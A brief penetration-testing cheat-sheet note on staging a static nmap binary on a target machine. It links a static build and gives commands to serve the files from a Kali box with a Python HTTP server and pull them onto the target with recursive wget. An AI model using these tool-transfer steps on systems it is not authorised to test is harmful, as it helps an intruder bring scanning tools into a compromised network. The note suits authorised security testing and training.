# NMAP

## static binary build

[Github link](https://github.com/ernw/static-toolbox/releases/tag/nmap-v7.91SVN)

## without unzip capability

This makes a new directory nmap to serve nmap static files from and uses recursive wget to transfer it.

1. On Kali
   1. `mkdir nmap; cd nmap/; unzip ../nmap.zip; python3 -m http.server 80`
2. On Target
   1. `wget --recursive --no-parent -R "index.html*" IP/`
   2. `-R`: rejects download for `index.html`